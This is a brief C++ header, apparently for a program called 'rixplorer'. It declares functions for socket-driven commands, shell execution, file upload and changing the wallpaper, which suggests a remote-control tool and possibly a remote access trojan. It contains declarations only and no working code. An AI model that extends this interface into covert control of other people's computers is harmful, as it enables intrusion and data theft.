// rixplorer.h
#include "Socket.h"
#include "Request.h"
void callCommand(Request *request, Socket *socket);
void setWallpaper(std::string filepath);
bool shellExec(string path);
DWORD CALLBACK shell(LPVOID lpParam);
void uploadFile(Socket *socket, string file);